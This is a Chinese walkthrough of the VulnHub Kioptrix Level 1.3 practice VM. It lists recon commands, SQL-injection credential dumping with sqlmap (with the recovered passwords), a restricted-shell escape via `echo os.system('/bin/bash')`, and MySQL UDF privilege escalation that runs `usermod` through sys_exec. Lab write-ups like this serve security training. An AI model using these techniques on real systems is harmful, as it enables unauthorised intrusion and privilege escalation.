# 原创
：  VulnHub渗透测试实战靶场 - KIOPTRIX: LEVEL 1.3

# VulnHub渗透测试实战靶场 - KIOPTRIX: LEVEL 1.3

#### VulnHub渗透测试实战靶场 - KIOPTRIX: LEVEL 1.3

## 环境下载

> 
戳此进行[环境下载](https://download.vulnhub.com/kioptrix/Kioptrix4_vmware.rar)


## KIOPTRIX: LEVEL 1靶机搭建

> 
由于压缩包内只有一个虚拟硬盘，需要打开一个虚拟机加入这块硬盘


> 
将原来的硬盘删去，选择下载好的靶机硬盘，并将网络适配器设置为NAT模式


> 
打开靶机即可


## 渗透测试

### 信息搜集

> 
用arp-scan探测一下网段内目标靶机的IP：`sudo arp-scan -l`<br/> 得到目标靶机的IP为：`192.168.246.136`


> 
用Nmap探测一下目标靶机IP的端口信息：`sudo nmap -sS -A 192.168.246.136`，发现开放了`22、80、139、445`四个端口


> 
用dirb扫描一下web目录：`dirb http://192.168.246.136`


### 漏洞挖掘

> 
测试登录框，发现疑似存在SQL注入漏洞


> 
用burpsuite抓包，扔进sqlmap中，成功得到Payload


> 
利用sqlmap爆数据库名


> 
利用sqlmap爆members数据库的表名


> 
利用sqlmap爆字段名


> 
利用sqlmap爆数据，得到两组用户名和密码


```
robert：ADGAdsafdfwt4gadfga==
john：MyNameIsJohn  

```

### getshell

> 
用前面注入得到的两组数据成功连接ssh


> 
利用echo，切换到交互式的shell：`echo os.system('/bin/bash')`


> 
查找网站相关内容信息，发现数据库没有密码


### 提权

> 
尝试 `mysql udf` 提权


> 
首先找到 `lib_mysqludf_sys.so` 的目录


> 
接着创建函数 `create function sys_exec returns integer soname 'lib_mysqludf_sys.so';`


> 
利用 `SELECT sys_exec('usermod -aG admin john');` 将 john 加入管理员组


> 
尝试切换到root用户，成功拿到root权限


#### 补充

> 
可以尝试用sqlmap来完成提权，[参考文章](https://cooltige.com/2020/06/02/Mysql-Udf%E6%8F%90%E6%9D%83/)

